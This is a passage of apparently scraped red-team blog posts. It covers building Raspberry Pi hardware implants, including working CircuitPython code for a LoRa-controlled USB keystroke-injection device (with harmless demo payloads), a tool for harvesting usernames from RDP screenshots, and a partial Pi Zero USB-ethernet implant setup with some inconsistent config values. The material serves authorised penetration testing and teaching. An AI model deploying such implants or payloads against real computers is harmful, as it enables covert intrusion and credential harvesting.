P4wnP1 - https://github.com/RoganDawes/P4wnP1\n\n Along with the Raspberry Pi Zero W, there is an USB On-the-go (OTG) breakout board that allows you to mount the Pi Zero to it and, in turn, you get a full-size USB type A port that allows you to plug the entire device into a PC USB port to power the device and use the host connected to perform attacks such as keystroke and mouse click injection attacks (and more). Essentially, it becomes a USB stick computer. Here is the one I used for most of my testing: https://www.amazon.com/dp/B098JP79ZX?psc=1&ref=ppx_yo2ov_dt_b_product_details\n\nI am a little embarrassed to say that I did not know these sorts of thing existed prior to jumping down this rabbit hole. But they are incredibly simple PCB that use pogo pins or SMD spring contacts to contact the test points on the bottom of the Pi Zero. So brilliant!\n\nThe last, and frankly more crucial piece of the puzzle, is adding the LoRa module to the device. Luckily for us, I stumbled across a design someone had made for\u2026 let me check my notes\u2026 yep, you guessed it: a Raspberry Pi Zero and a LoRa RMF95 module!! The details for the LoRaPi breakout board can be found here: https://digitalconcepts.net.au/pcbs/index.php?op=lorapi\n\nhttps://digitalconcepts.net.au/pcbs/content/images/lorapi/LoRa%20Pi%20Zero%20Mk%202.jpg\n\nhttps://digitalconcepts.net.au/pcbs/content/support/lorapi/LoRaPi-0-16%20Top.png\n\nI immediately downloaded the design files and sent an order for 10 PCBs and waited for them to arrive. Once they finally arrived from China, I whipped out the tape of RFM 95 modules sitting on my desk and started assembling a couple.\n\nIn the assembly instructions, there is a basic configuration that is mentioned, and, if you plan to replicate this setup, that is all you need. PCB, LoRa Module, 2x8 header, and an antenna connector (SMA or u.fl). Pretty simple stuff.\n\nAfter soldering up the first set of boards and connecting them to a Pi Zero, I couldn\u2019t get them to work. The radio would just never configure itself over SPI, and it errored out indicating there could be a wiring issue. This was the same as the second one I tried. UGH.\n\nA little troubleshooting later, I determined that I needed to use the CE1 chip selection pin instead of CE0 for some reason on the Pi Zero. Simple enough, I just need to desolder the solder jumper on the LoRaPi breakout board from CE0 and resolder the chip select (NSS) jumper pad to the CE1 pin on the header. Once I did this, everything worked just as expected.\n\nExample Solder Jumper from CE1 to NSS pad\n\nHere is a completed LoRaPi module with 2x8 pin header to connect to Pi.\n\nLoRaPi Breakout Board w/SMA\n\nHere is an example of the LoRaPi module connected to a Pi Zero W with 5dBI antenna attached.\n\nIf you build one of these devices to play around with, I do recommend that you use a 2x8 pin header so that you can easily remove the module from your Pi if you want to repurpose the Pi. Otherwise, if you are looking to make a more permanent version, you can solder the module directly to the header pins of the Pi. I found that the black plastic portion on the header was just tall enough to provide clearance for the LoRaPi module to sit flush with it and not touch the second Micro USB port on the Pi Zero W. I did put a layer of Kapton tape on the bottom of the PCB just in case, but it really is not needed.\n\nJust enough clearance when soldered directly to Pi Zero\n\nSo, there you have it, a Pi Zero W with USB OTG and LoRa RFM95 module for out-of-band communication!\n\nStayed tuned for the next blog in this series focusing on the software for configuring and using the RFM95 LoRa Module.\n\nFootnotes\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Offensive IoT for Red Team Implants (Part 2)\"\nTaxonomies: \"Hardware Hacking, How-To, Informational, Physical, Red Team, Red Team Tools, Tim Fowler\"\nCreation Date: \"Thu, 16 May 2024 15:00:00 +0000\"\n\nThis is Part Two of the blog series, Offensive IoT for Red Team Implants, so if you have not read PART ONE, I would encourage you do to so first and then come back here.\n\nIn this blog, we are going take a \u201cfrom the ground up\u201d approach to getting a Raspberry Pi Pico (Pico W) set up and running as a physical implant device for attacks such as USB Rubbery Ducky. Then, we will pivot slightly and extend the capability for the implant device by enabling and using a bolted-on LoRa module to take the entire attack process to level 11. Let\u2019s dive in.\n\nYou are going to need to have some basic hardware accessible to you, mainly: a Raspberry Pi Pico or Pico W (which I will just reference as a Pico from here on out) and a micro USB cable. (You also need a computer, but I am assuming that was a given.)\n\nGetting Started\n\nTo get started, you will need to set up the environment for the configuring and programming of your Pico. For this blog series, we are going to be using CircuitPython1 as our language of choice. There are many options available for the Pico platform, including C/C++ and Arduino, but, for this use case, Circuit Python is a pretty solid choice, with its ease of use and preexisting libraries.\n\nYou are also going to need some sort of IDE to develop your code in. For this blog, we are going to use Thonny IDE, which touts itself as a Python IDE for beginners.2 You don\u2019t have to use Thonny; there are many IDEs out there to choose from, but for the purpose of keeping it simple, that is what we will use.\n\nThonny IDE\n\nFirst, you need to download Thonny from the website: https://thonny.org/\n\nThonny is cross-platform compatible, so whether you are running on Windows, a Mac, or Linux, you should not have any issues.\n\nAfter you have downloaded the installer for your OS of choice, you then need to install Thonny by executing the installer. I happened to be on a Windows system while authoring this blog, so below is a screenshot of what the install looks like on Windows.\n\nOnce you have Thonny installed, you are ready for the next steps \u2014 installing Circuit Python on your Pico.\n\nCircuit Python\n\nTo get your Pico running with CircuitPython, you need to first download the version of CircuitPython that corresponds to the Pico you have. In my case, I am using a Pico W, but you could also be using just a Pico, or, possibly, one of the 495 boards CircuitPython supports. While this blog is based on the Pico and Pico W, it\u2019s important to note that this process should work with any RP2040-based board (but your milage may vary).\n\nAfter selecting your board on the CircuitPython Download page, you will be taken to a page where you can download the CircuitPython firmware file, a .UF2 file, for your chosen board.\n\nDownload the latest stable release firmware file to your computer; at the time of this writing, it was 9.0.4.\n\nOnce you have downloaded the .UF2 file, you can then connect your Pico to your computer using a micro USB cable. I would suggest you first plug the micro USB end of the cable into the Pico, WITHOUT the other end of the USB cable being plugged into your computer. The reason for this is that you will need to hold down the BOOTSEL button on the Pico when powering up to install CircuitPython, and that is a lot easier to do if you use one hand to hold the button down and the other to connect the USB cable to your computer.\n\nAfter powering up the Pico with the BOOTSEL button being held down, the Pico should present as a drive on your computer and should be named RPI-RP2 or something similar.\n\nNow, you will want to find where you downloaded the firmware file. You are going to need to copy it to the new drive on your computer.\n\nAfter successfully copying the firmware file to the drive, it should automatically disconnect from your host and then reconnect after a few moments, which, at that point, you should have a new drive appear called CIRCUITPY. If you have this new drive mounted on your computer, you have successfully installed CircuitPython on your Pico and are ready for the next steps.\n\nNow, you need to open the Thonny IDE. In doing so, it should automatically connect to the COM port where your Pico is attached; in my case, it was COM9, but yours may be different.\n\nIf it does not automatically connect to your Pico\u2019s COM port, you can manually select which COM port you would like to connect to using the menu in the lower right corner of the Thonny IDE.\n\nIn Thonny, you need to install some packages so do this, click on Tools, and then Manage packages.\n\nWhen the Manage Packages screen opens, you need to search for the following: adafruit-circuitpython-hid and then click the search button on the right.\n\nYou should get a single result \u2014 click on it, and then click \u2018Install\u2019 at the bottom of the screen.\n\nNow, you should have everything configured and ready to start writing some code to make your Pico something slightly more sinister.\n\nWrite Some Code\n\nThe next step is for you to open the file code.py that is on your Pico. To do this, you can click on the folder icon in the menu bar and then select the bottom option, CircuitPython device.\n\nThen a file prompt will open, and you can select code.py.\n\nYou may find that your code.py already has something in it, like print(\u201cHello World\u201d), but no worries, you can delete that and then copy the following code into the file.\n\nimport time\nimport board\nimport usb_hid\n\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nfrom adafruit_hid.keycode import Keycode\n\n# Setup for keyboard emulation\nkeyboard = Keyboard(usb_hid.devices)\nlayout = KeyboardLayoutUS(keyboard)\n\n# Function to perform a combination of key presses\ndef press_keys(*keys, delay=0.1):\n keyboard.press(*keys)\n time.sleep(delay)\n keyboard.release_all()\n\ntime.sleep(2) # Delay to make sure the device is connected before trying to injection keystrokes\n# Open a web browser\npress_keys(Keycode.GUI, Keycode.R) # Windows key + R to open run dialog\nlayout.write('https://www.youtube.com/watch?v=dQw4w9WgXcQ&themeRefresh=1\\n')\n\nClick on the Save icon to save the file and then hit F5 or the green run button to test your code. If everything worked as expected, you should have had a web browser open and everyone\u2019s favorite YouTube video started playing.\n\nIf that did not work for you, there are a couple of reasons why that may be the case. First, the code you ran was written to be executed on a Windows-based PC. If you are doing your development on something other than Windows, you would need to connect your Pico with your code running to a Windows PC to see if it worked. Secondly, there could have been an error in your copy-and-paste process, so double check the code and use the error messages in the Thonny console to help you diagnose the issue.\n\nAssuming it all did work for you, the code you just ran is not exceptionally evil, as you can see. What you have done is performed a keystroke injection attack using Python. Hard? Not really. Impressive? Again, not really. However, this lays the groundwork for a very powerful keystroke injection platform, but this is currently about the absolute most basic thing you can do with this approach. We need to do more!\n\nLet\u2019s start by installing a new library called Adafruit-circuitpython-ducky within Thonny IDE. To do this, click on Tools > Manage packages, and then search for the package by name and install.\n\nThis package allows us to use pre-written Ducky Script payloads and have them execute via our Python code. This is super effective, as it allows one to use the plethora of existing payloads without the need to write each one from scratch.\n\nOnce you have the ducky package installed, you can modify your code.py file with the following contents to leverage the library.\n\nimport time\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nimport adafruit_ducky\n\ntime.sleep(2) # Sleep for a bit to avoid a race condition on some systems\nkeyboard = Keyboard(usb_hid.devices)\nkeyboard_layout = KeyboardLayoutUS(keyboard) # We're in the US :)\n\nduck = adafruit_ducky.Ducky('duckyscript.txt', keyboard, keyboard_layout)\nresult = True\nwhile result is not False:\n result = duck.loop()\n\nWhat the previous code does is open a file called duckscript.txtand iterates over it, injecting each line within the script as keystrokes on the target computer. But to dothis, we need a payload file, so let\u2019s generate that now.\n\nCreate a new file within Thonny called duckyscript.txt, add the following text, and save it to the device as duckyscript.txt.\n\nWINDOWS r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\n\nThe DuckyScript3 code you just saved to a file does the exact same thing as the previous Python code but is much simpler to read and write.\n\nNow, run your code.py by clicking on the Run icon or hitting F5.\n\nYou should get the same result as previously but with code that is a lot more reusable.\n\nAt this point, you can replace duckscript.txt with any DuckyScript payload and your Pico should be able to run it just fine. You have now created a simple USB rubber ducky-style implant device using Pico and some Python code, but I think if you have made it this far, you are expecting a little more than a simple replication of existing abilities.\n\nTeaching a Rubber Duck to Fly\u2026\n\nSo, while the code works and does allow us to use a Pico as a USB rubber ducky, that is still a pretty limited use case because, as it is, we really only have the ability to run the single duck script. Yes, we could create another loop that would then execute additional duck scripts, but that forces you to really plan and load everything you need ahead of time. What if you can opt to run additional scripts later and even add new scripts? That would be something, wouldn\u2019t it? Well, there are devices out there than can do this already using with Wi-Fi or Bluetooth, but the issue with that approach is that, one, those mechanisms have a limited range, and, two, they can easily be detected. Thirdly, that\u2019s just not as fun as what we are about to do.\n\nIoT Enters the Room\u2026\n\nOkay, so let\u2019s level set for just a moment \u2013 we are not really using IoT devices for physical implants but rather, we are going to leverage one of the common IoT communication methods; in this case, LoRa. I talked about some of the reasons why this is a good and interesting option in the previous blog post, so if you want to understand the why of LoRa, go back and read it.\n\nCompleted Pico-LoRa PCB in Acrylic Case\n\nTo do this, I am using a custom PCB that has a Pico W and RFM95 LoRa module on it, but you don\u2019t need custom hardware as you can buy an off the shelf solution like the Adafruit Feather RP2040 with RFM95 https://www.adafruit.com/product/5714 which is effectively the same hardware I am using, in a prebuilt package.\n\nAlso, it is vital to note that you will need TWO devices to be able to perform this Over-The-Air (OTA) Rubber Ducky attack \u2014 one device as your implant and one device that will act as your sender.\n\nFor my purposes, I am just using two of the custom PCBs, but you could use two of the Adafruit Feathers or any other supported devices, if the LoRa modules are the same and the same configuration for said modules is used.\n\nImplant Code\n\nWe are going to start with the code for the implant device first. We need to add one more library to our device so that we can use the attach LoRa module. In this case, we are going to use the Adafruit-circuitptytthon-rfm9x library that can be installed in the same manner as the other libraries.\n\nOnce you have installed the library, you can open up the code.py file on your implant device in Thonny and copy the following code. There is no need to understand 100% of what is happening in the code but, at a high level, the code sets the type of HID to present as, as well as the keyboard layout we want to use. Then, it does some LoRa module configuration followed by defining the function to receive a script from over the air, a function to execute said script as well as defining main().\n\nimport time\nimport board\nimport busio\nimport digitalio\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keyboard_layout_us import KeyboardLayoutUS\nimport adafruit_rfm9x\nimport adafruit_ducky\n\n# Initialize keyboard\nkeyboard = Keyboard(usb_hid.devices)\nkeyboard_layout = KeyboardLayoutUS(keyboard)\n\n# Initialize SPI connection\nspi = busio.SPI(board.GP2, MOSI=board.GP3, MISO=board.GP4) # Your SPI Pins may be different\n\n# Configure RFM95 CS and RESET pins\ncs = digitalio.DigitalInOut(board.GP5)\nreset = digitalio.DigitalInOut(board.GP6)\n\n# Initialize RFM9x\nrfm9x = adafruit_rfm9x.RFM9x(spi, cs, reset, 915.0) # Adjust frequency to match your region\nrfm9x.tx_power = 13 # Default transmission Power\nrfm9x.signal_bandwidth = 250000 # 250000 # Set signal bandwidth\nrfm9x.coding_rate = 5 # Set coding rate (4/5, 4/6, 4/7, 4/8)\nrfm9x.spreading_factor = 7 # Set spreading factor (6 to 12)\nrfm9x.node = 255\n\n# Function to receive scripts and write them to a file\ndef receive_scripts():\n print(\"Waiting for new scripts via LoRa...\")\n with open('lora_script.txt', 'w') as file: # Open file in write mode\n while True:\n packet = rfm9x.receive(timeout=None) # Block indefinitely until a packet is received\n if packet is not None:\n script_line = str(packet, 'utf-8').strip() # Decode packet text\n print(\"Received line:\", script_line)\n if script_line == 'DNE': # Check for termination string\n print(\"End of script received.\")\n break # Exit the loop to process the script\n file.write(script_line + '\\n') # Write each line to the file\n else:\n pass #print(\"No packet received, continuing to listen...\")\n\n# Function to execute the script\ndef execute_script(filename):\n duck = adafruit_ducky.Ducky(filename, keyboard, keyboard_layout)\n result = True\n while result is not False:\n result = duck.loop()\n\n# Main function to handle script reception and execution\ndef main():\n time.sleep(2)\n execute_script('duckyscript.txt')\n while True:\n receive_scripts()\n execute_script('lora_script.txt')\n\nmain()\n\nWhen this code is run on the Pico, it will first execute the script duckyscript.txt as the default script after a short delay of 2 seconds to make sure the host is ready. This initial script could be anything you want it to be but, in our case, I have left it unmodified. Then, after running the default script, the Pico enters a loop where it will listen for any new scripts coming in over LoRa. Once the entire script has been received, it is saved to the Pico\u2019s filesystem and then executed and the loop repeats, waiting for the next script to come in.\n\nIf you were able to send a new script over LoRa to the implant, it would fail because, as it stands, the file system is not writable. To change this, you need to create a new file with the following contents and then save it as boot.py.\n\nimport storage\n\nstorage.remount('/', readonly=False)\n\nThis code will allow CircuitPython to be able to write to the filesystems and save any script received over LoRa.\n\nYou now have your implant ready to go. Disconnect it from your host for now. Thonny can get temperamental trying to configure multiple devices at the same time, so its better to just have one device at a time connected.\n\nSender Code\n\nNow, for the sending side of the equation. First, you will want to connect your second device to your computer and select the appropriate COM port in Thonny. Next, you will need to install the necessary libraries, which should only be adafruit-circuitptytthon-rfm9x. All other dependencies will be installed with the RFM9x library.\n\nAfter installing the RFM9x library, you can open code.py and copy the following code into it.\n\nimport time\nimport board\nimport busio\nimport digitalio\nimport adafruit_rfm9x\n\n# Serial setup\nimport usb_cdc\nserial = usb_cdc.data \n\n# Initialize SPI connection\nspi = busio.SPI(board.GP2, MOSI=board.GP3, MISO=board.GP4)\n\n# Configure RFM95 CS and RESET pins\ncs = digitalio.DigitalInOut(board.GP5)\nreset = digitalio.DigitalInOut(board.GP6)\n\n# Initialize RFM9x\nrfm9x = adafruit_rfm9x.RFM9x(spi, cs, reset, 915.0) # Adjust frequency to match your region\nrfm9x.tx_power = 13 # Default transmission\nrfm9x.signal_bandwidth = 250000 # 250000 # Set signal bandwidth\nrfm9x.coding_rate = 5 # Set coding rate (4/5, 4/6, 4/7, 4/8)\nrfm9x.spreading_factor = 7 # Set spreading factor (6 to 12)\nrfm9x.node = 255\n\n# Function to receive from serial and send over LoRa\ndef receive_and_transmit():\n while True:\n print(\"Waiting for data...\")\n line = serial.readline().decode().strip() # This should block until a line is received\n if line:\n print(\"Received from serial:\", line)\n rfm9x.send(bytes(line, 'utf-8'))\n print(\"Sent over LoRa:\", line)\n\nreceive_and_transmit()\n\nThis code is pretty simple, as it sets up the LoRa module configuration and then listens to the serial port for data that then gets transmitted over LoRa.\n\nNext, you will need to create boot.py file on this device with the following content:\n\nimport usb_cdc\n \nusb_cdc.enable(console=True, data=True) \n\nIn order for the boot.py code to work, you will need to fully disconnect your second device and reconnect it. What this code is doing is creating a second serial port on the device that allows us to monitor what is happening in Thonny, as well as sending data to the secondary serial port for it to be transmitted. I call this a development quality of life configuration.\n\nSend to Sender Code\n\nWith the device code completed, the last thing we need to do is create some client code that can send a ducky script file over serial to the sender device for transmission.\n\nOn your host, create a file called sender.py and save the following contents to it:\n\nimport serial\nimport time\n\n# Configure your serial connection\nserial_port = 'COM14' # This will vary based on your operating system and setup\nbaud_rate = 115200 # Make sure this matches the baud rate on your Pico\n\ndef send_script(filename):\n try:\n with serial.Serial(serial_port, baud_rate, timeout=1) as ser:\n\n with open(filename, 'r') as file:\n for line in file:\n print(\"Sending: \", line.strip())\n ser.write(line.encode() + b\"\\n\")\n time.sleep(0.5) # Give the Pico time to process and send the line\n ser.write(b'DNE\\n') # Termination Line for EOF\n except serial.SerialException as e:\n print(\"Error opening or using the serial port:\", e)\n\nsend_script('duckyscript.txt')\n\nYou will need to update the serial_port value on line 5 to match that of the serial port on your host. Remember, now the device will present two serial ports to your host \u2014 in my case, COM13 and COM14. COM14 is the secondary serial port in my setup but you may have to try a couple of different values depending on your setup.\n\nThis code simply reads in the contents of the file duckscirpt.txt and then sends it, line by line, over to the sender device for transmission. When the end of the file is reached, a single line of DNE\\n is written to the serial interface indicating the EOF. Save the code.\n\nLastly, you need to save a payload on your host called duckyscript.txt with whatever Ducky Script payload you want.\n\nHere I am using this simple payload that launches the Task Manager as a proof-of-concept.\n\nCONTROL SHIFT ESC\n\nSave the code, and you should be ready to go and fly our first rubber ducky over the air!\n\nExecution Time\n\nTo launch the attack, you will first need to deploy your implant device by connecting it to the target PC. Then, from your attacking host, connect the sender device to your host, configure your sender.py script with the correct COM port, and fire away with the command python3 sender.py.\n\nUsing a software-defined radio dongle, like the RTL-SDR, and a utility, like SDR#, you can see the LoRa packets being transmitted over the airwaves.\n\nOn the target device, Task Manager should be running on the screen. Just as we planned it!\n\nIf all worked well, your victim should have not only gotten Rick-Rolled, but also fallen victim to a flyby rubber ducky attack.\n\nFootnotes\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Introducing Squeegee: The Microsoft Windows RDP Scraping Utility\"\nTaxonomies: \"David Fletcher, Informational, Red Team, Red Team Tools\"\nCreation Date: \"Fri, 17 May 2024 16:00:00 +0000\"\n\nHi, it\u2019s David with BHIS! You\u2019ll be saying, \u201cWow,\u201d every time you use this tool. It\u2019s like a shammy. It\u2019s like a towel. It\u2019s like a sponge. A regular towel doesn\u2019t work wet. This works wet or dry. This is for the house, the car, the boat, the RV. It's Squeegee! Holds 12 times its weight in liquid. Look at this. It just does the work. Why would you want to work twice as hard? It doesn\u2019t drip. It doesn\u2019t make a mess.\n\nJust kidding. Squeegee won't clean up your messes, but hopefully, you will find it useful on your tests. Squeegee is actually a tool to scrape text from RDP screen captures.\n\nYou are probably asking yourself why that might be useful. We are constantly thinking about ways to get information using unconventional techniques. Imagine that you are on an internal penetration test and you want to know what the local administrator account username is on hosts, but you have hundreds or thousands of RDP listeners on the network. How might you approach that problem?\n\nNext, consider a situation where you might want to get active session information from the environment in an effort to move laterally and escalate privileges. Bloodhound session data isn't as reliable as it used to be, and, in modern Windows environments, session enumeration tends to get caught. What about cataloging users with active RDP sessions?\n\nExample RDP Logged In Users\n\nSqueegee can help in both of these situations. The first step is to collect RDP screen captures using a tool like NCC Group's scrying. Once you have the RDP screen captures, you can process the entire group of results using Squeegee by just pointing the tool at the correct folder.\n\nSqueegee Execution\n\nSqueegee will filter string content that is not likely to be useful in the context of username harvesting and system analysis. In addition, the tool will interpret various strings commonly observed in RDP image output to identify the operating system, the domain the computer is joined to, and whether the system is missing patches. Reporting options include console output, logfile output, and an HTML report.\n\nThe HTML report organizes results by operating system and includes links to download the full list of unique usernames and usernames associated with a given RDP instance.\n\nSqueegee HTML Report (Table of Contents)\n\nSqueegee Sample Results\n\nSqueegee uses the easyocr library for OCR support. As a result, text can be extracted from images with support for 81 different languages. This provides an easy method to process an image like the one shown below.\n\nRDP Screen Capture with Non-Latin Characters\n\nWithout OCR support, reproducing strings presented on the screen may take considerable effort. Passing in the ISO language code to the script will cause easyocr to process strings associated with the target language. Once the images have been processed, usernames can be copied and pasted from the report or downloaded in the accompanying text file.\n\nNon-Latin Strings Extracted from RDP Screen Capture\n\nCheck out the Squeegee repository at https://github.com/OOAFA/squeegee.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Offensive IoT for Red Team Implants (Part 3)\"\nTaxonomies: \"Hardware Hacking, How-To, Informational, Physical, Red Team, Red Team Tools, Tim Fowler\"\nCreation Date: \"Thu, 23 May 2024 14:00:00 +0000\"\n\nThis is part three of the blog series, Offensive IoT for Red Team Implants. We will be building off from where we left off in the last post, which can be found here: PART TWO\n\nIf you have not already read the previous blog posts, I would encourage you to do so first and then come back here. \n\nIn the last post, we walked through how to use a Raspberry Pi Pico as a USB rubber duck and extended its capability using an attached LoRa modem to allow for over-the-air execution of DuckyScript files.  \n\nIn this post, we are going to go one step further, using everything we have learned thus far and ramping it up to 11.  \n\nIf you recall, in the first blog of this series, I showed an example of Raspberry Pi Zero W with a RM95 LoRa module attached to the header pins.  \n\nWell, we are going to use that setup as hardware for the remainder of this post, along with one of the custom Pico/LoRa PCBs from the previous blog post, but that could easily be substituted for an Adafruit Feather RP2040 with LoRa or the like.\n\nBelow is the hardware that will be used:\n\nImplant Hardware -\n\nRaspberry Pi Zero W\n\nUSB Dongle Boarb for Pi Zero\n\nRFM95 LoRa Module on Breakout board\n\n915MHz u.fl Antenna\n\nOperator Hardware -\n\nPico-LoRa Breakout Board\n\nOr Adafruit Feather RP2040 with LoRa: https://www.adafruit.com/product/5714\n\nOne note on the USB Dongle board for the Pi Zero \u2013 there are multiple options but, far and away, my preferred version is the Geek Pi USB Dongle Expansion Board, which can be bought on Amazon for about $11: https://www.amazon.com/GeeekPi-Dongle-Expansion-Raspberry-Inserted/dp/B098JP79ZX.\n\nThere are other options; as I said, I have tried most of them and all do work for this purpose. The entire objective of these USB boards is to provide the ability to connect the implant over a USB Type A port, like you would a USB drive, instead of needing cables to power the Pi and transfer data.\n\nFor the remainder of this blog post, we are going to focus on configuring the Pi Zero so that it presents itself to a target computer as a USB ethernet device and automatically assigns it an IP address so that the implant and the host can communicate over TCP/IP.\n\nIn my opinion, this is the hardest but most critical part of the setup in using a Pi Zero as a physical implant. Unlike the Raspberry Pi Pico, which is rather limited, having the full-fledged Linux computer as your implant is a very powerful tool and having the ability to have the host communicate back to the implant is imperative for this to maximize the potential of the platform.\n\nDiving In\n\nOnce you have your hardware ready, you will need to install an OS on a MicroSD card. I would recommend using Raspbian as well as the Raspberry Pi Imager software to install the OS on the card. When doing this, it\u2019s advised that you enable SSH and configure Wi-Fi, as it will make it easier to just plug the Pi Zero W into your host and get started.\n\nAfter the SD card is ready, insert into the slot and plug your USB Dongle into a computer. After some time, it should power up and you should be able to SSH into it using the credentials you set during installation and .local with the hostname that was set up during installation.\n\nOnce you\u2019re connected to the Pi Zero, make sure all updates are installed before making changes to the configuration. First, you will need to modify the config.txt file located at /boot/config.txt and add the following line at the end:\n\ndtoverlay=dwc2\n\nThis configuration option enables USB gadgets that will be leveraged shortly. Next, reboot your Pi Zero using the sudo reboot command so that USB gadgets will be enabled.\n\nAfter you have rebooted, connect back to your Pi Zero where you will need to create a script that will do most of the heavy lifting in the configuration of your USB gadget.\n\nThe script here is almost an exact copy of what can be found in this blog post: https://jon.sprig.gs/blog/post/2243\n\nI would encourage you to read it, as the author does a wonderful job explaining the \u201cWHY\u201d for everything \u2014 not just with this script, but for most of the process that follows. I have made some modifications to the author's code to simplify things for our needs, but give all credit to Jon \"The Nice Guy\" Spriggs.\n\nWhat you need to do is copy the following script into a file, located at /opt/implant.sh, using the following command:\n\nSudo nano /opt/implant.sh\n\n#!/bin/bash\n# Based on a combination of: http://www.isticktoit.net/?p=1383\n# and: https://www.raspberrypi.org/forums/viewtopic.php?t=260107\n# and: https://gist.github.com/schlarpc/a327d4aa735f961555e02cbe45c11667/c80d8894da6c716fb93e5c8fea98899c9aab8d89\n# and: https://github.com/ev3dev/ev3-systemd/blob/02caecff9138d0f4dcfeb5afbee67a0bb689cec0/scripts/ev3-usb.sh\n\nconfigfs=\"/sys/kernel/config/usb_gadget\"\nthis=\"${configfs}/Implant\"\n\n# Configure values\nserial=\"$(grep 'Serial' /proc/cpuinfo | head -n 1 | sed -E -e 's/^Serial\\s+:\\s+0000(.+)/\\1/')\"\nmodel=\"$(grep 'Model' /proc/cpuinfo | head -n 1 | sed -E -e 's/^Model\\s+:\\s+(.+)/\\1/')\"\nmanufacturer=\"Raspberry Pi Foundation\"\n\n# The serial number ends in a mac-like address. Let's use this to build a MAC address.\n# The first binary xxxxxx10 octet \"locally assigned, unicast\" which means we can avoid\n# conflicts with other vendors.\nmac_base=\"$(echo \"${serial}\" | sed 's/\\(\\w\\w\\)/:\\1/g' | cut -b 4-)\"\necm_mac_address_dev=\"02${mac_base}\" # ECM/CDC address for the Pi end\necm_mac_address_host=\"12${mac_base}\" # ECM/CDC address for the \"host\" end that the Pi is plugged into\nrndis_mac_address_dev=\"${mac_base}22\" # RNDIS address for the Pi end\nrndis_mac_address_host=\"32${mac_base}\" # RNDIS address for the \"host\" end that the Pi is plugged into\n\n# Make sure that libComposite is loaded\nlibcomposite_loaded=\"$(lsmod | grep -e '^libcomposite' 2>/dev/null)\"\n[ -z \"${libcomposite_loaded}\" ] && modprobe libcomposite\nwhile [ ! -d \"${configfs}\" ]\ndo\n sleep 0.1\ndone\n\n# Make the path to the libComposite device\nmkdir -p \"${this}\"\n\necho \"0x0200\" > \"${this}/bcdUSB\" # USB Version (2)\necho \"0x1d6b\" > \"${this}/idVendor\" # Device Vendor: Linux Foundation\necho \"0x0104\" > \"${this}/idProduct\" # Device Type: MultiFunction Composite Device\necho \"0x02\" > \"${this}/bDeviceClass\" # This means it is a communications device\n\n# Device Version (this seems a bit high, but OK)\n# This should be incremented each time there's a \"breaking change\" so that it's re-detected\n# rather than cached (apparently)\necho \"0x4000\" > \"${this}/bcdDevice\"\n\n# \"The OS_Desc config must specify a valid OS Descriptor for correct driver selection\"\n# See: https://www.kernel.org/doc/Documentation/ABI/testing/configfs-usb-gadget\n\nOnce you have saved that file, you will need to make it executable, using the command: sudo chmod +x /opt/implant.sh\n\nNext, you need to create a service to run the script automatically. To do that, create a file called Implant.service at /lib/systemd/systems/Implant.service. I used the following command to do so:\n\nsudo nano /lib/system/system/Implant.service\n\nPaste the following script into the file, Implant.service.\n\n[Unit] Description=Start libComposite \n[Service] Type=oneshot \nExecStart=/opt/lib_composite.sh \n[Install] WantedBy=multi-user.target\n\nSave that file, and then enable the service using the following command:\n\nsudo systemctl enable Implant.service\n\nNow, you will need to reboot your implant.\n\nOnce the implant comes back up and you reconnect to it, issue the ifconfig command. You should now see two interfaces, usb0 and usb1.\n\nFor reasons that were discussed in the Jon Spriggs blog post linked previously, we configured two interfaces, but we are only really concerned about the usb1 interface, as it is the only interface that will work with a modern Windows host. The usb0 interface is for legacy systems, and, while you may never actually use it, we configured two just in case.\n\nCurrently, these interfaces do not have any configuration applied to them, so that is the next step.\n\nCreate a file in /etc/network/interfaces.d/ called usb0 and populate it with the following details. You can use the command sudo nano /etc/network/interfaces.d/usb0 to create the file.\n\nallow-hotplug usb0\niface usb0 inet static\n address 192.168.254.2\n netmask 255.255.255.0\n\nSave that file and repeat the process for usb1, by creating the file /etc/network/interfaces.d/usb1 and saving the following content to it.\n\nallow-hotplug usb1\niface usb1 inet static\n address 192.168.255.2\n netmask 255.255.255.0\n\nHaving configured the interfaces, now you need to configure a DHCP service to issue an IP address to your target host. For this purpose, we are going to use dnsmasq, which you will need to install with the following command:\n\nsudo apt install dnsmasq\n\nAfter the successful installation of dnsmasq, you will then need to configure it by editing the dnsmasq configuration file located at /etc/dnsmasq.conf.\n\nUsing the following command, you can create the file and save the code below:\n\nsudo nano /etc/dnsmasq.conf\n\ninterface=usb0\ninterface=usb1\nbind-interfaces\n\ndhcp-range=usb0,192.168.254.3,192.0.2.3,2h\ndhcp-range=usb1,192.168.255.3,192.168.255.3,2h\n\ndhcp-option=option:router\n\nThe configuration you just set in the dnsmasq.conf file is pretty simple, but I will provide a high-level overview so that you are not flying blind.\n\nThe first three lines are simply setting interfaces within dnsmasq, but the really important stuff is the two dhcp-range lines where the DHCP scopes for each interface is configured and, in this case, we set the DHCP range to be a single IP address: 192.168.25X.3. This allows the target host to receive a single known IP address and that is it!\n\nThe last line effectively tells dnsmasq to not set a gateway/router when issuing an DHCP address. We need to do this so that you don\u2019t interfere with the host\u2019s routing\u2026 for now.\n\nNext, you need to tell dnsmasq not to bind to the localhost. You can do this by uncommenting the last line of /etc/default/dnsmasq to say DNSMASQ_EXCEPT=\u201dlo\u201dand saving the file.\n\nYou can do this using the command sudo nano /etc/default/dnsmasq.\n\nNow dnsmasq is configured, you need to create a shell script and a service to start dnsmasq AFTER the interfaces have come up, as the dnsmasq configuration requires those interfaces being up as a dependency for the configuration to be applied.\n\nCreate a script at /opt/dnsmasq.sh and insert the code below using the following command:\n\nsudo nano /opt/dnsmasq.sh\n\n#!/bin/bash\nset -x\nsystemctl disable --now dnsmasq\nmv /etc/init.d/dnsmasq /etc/init.d/dnsmasq.initd\nsed -i -e \"s/Requires=network.target/Requires=network.target sys-subsystem-net-devices-usb0.device sys-subsystem-net-devices-usb1.device/\" -e \"s~/etc/init.d/dnsmasq ~/etc/init.d/dnsmasq.initd ~g\" /lib/systemd/system/dnsmasq.service\n\nSave the file and make the script executable using the following command:\n\nsudo chmod +x /opt/dnsmasq.sh\n\nThen, you need to create a unit 